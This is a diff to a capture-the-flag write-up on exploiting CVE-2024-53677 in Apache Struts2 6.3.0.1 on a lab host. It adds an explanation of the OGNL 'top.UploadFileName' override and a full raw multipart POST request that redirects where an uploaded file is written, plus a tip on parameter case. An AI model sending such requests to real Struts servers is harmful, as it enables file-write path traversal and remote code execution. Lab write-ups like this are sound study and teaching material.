@@ -42,12 +42,50 @@ We do get a id and password:
 
 Looking at the source code, the MVC is (Apache) `Struts2` with version `6.3.0.1`.
 
-As we can upload file, googling CVE for this version, there is [CVE-2024-53677](https://www.cve.org/CVERecord?id=CVE-2024-53677) which allows arbitrary path traversal and RCE. [POC](https://github.com/EQSTLab/CVE-2024-53677/blob/main/CVE-2024-53677.py)
+As we can upload file, googling CVE for this version, there is [CVE-2024-53677](https://www.cve.org/CVERecord?id=CVE-2024-53677) which allows arbitrary path traversal and RCE. [POC](https://github.com/EQSTLab/CVE-2024-53677.git)
 
 I tried the exploit in the above posts, but it does not work directly. The working of the exploit is also not straight forward. So, I look deeper into what causes the vulnerability and how can we craft our exploit. This post explains quite well: https://help.tanium.com/bundle/CVE-2024-31497/page/VERT/CVE-2024-53677/Understanding_Apache_Struts.htm.
 
+We can have alook athe 
+
 So, Struts has a series of Interceptor classes that run by default, including one called the `FileUploadInterceptor`. Struts has this concept of the object graph navigation library (OGNL), which has a stack. If there are two objects on the stack, and it allows referencing some property, say `name`, and that will work down the stack looking for the first object that has that property and return that.
 If a POST request triggers the `FileUploadInterceptor`, you can have other POST parameters that reference parts of that object by the OGNL stack. In practice, that looks like:
+```
+POST /upload.action HTTP/1.1
+Host: strutted.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------257100227792270914038585987
+Content-Length: 518
+Origin: http://strutted.htb
+DNT: 1
+Connection: keep-alive
+Referer: http://strutted.htb/upload.action
+Cookie: JSESSIONID=B49FBC232ACDD342D2ABC2C6B7C0342D
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+-----------------------------257100227792270914038585987
+Content-Disposition: form-data; name="upload"; filename="Screenshot_20250902_042406.png"
+Content-Type: image/png
+
+PNG
+
+IHDR-uijhlajkdhfaljfadf af;fda
+-----------------------------257100227792270914038585987
+Content-Disposition: form-data; name="top.UploadFileName"
+
+different.txt
+
+helloworld
+-----------------------------257100227792270914038585987--
+```
+
+The first form data parameter will be processed into an object by the `FileUploadInterceptor`. Then the second parameter is processed, setting the `UploadFileName` (Which an internal variable that Interceptor uses) for the top of the stack (the first parameter) to this new value. This trick allows for bypassing other rules put in place about where a file can be written, including directory traversals. This means the "filename" i.e. where file is written can be modifier. So we can modify it in such a way that it can be accessed by us via browser!
+NOTE: One important thing to consider which I found after reading about custom payload, the first file upload needs to have `name=Upload` with an Upper case `U`. Otherwise this exploit does not work.
+![[Pasted image 20250905175120.png]]
 
 
 
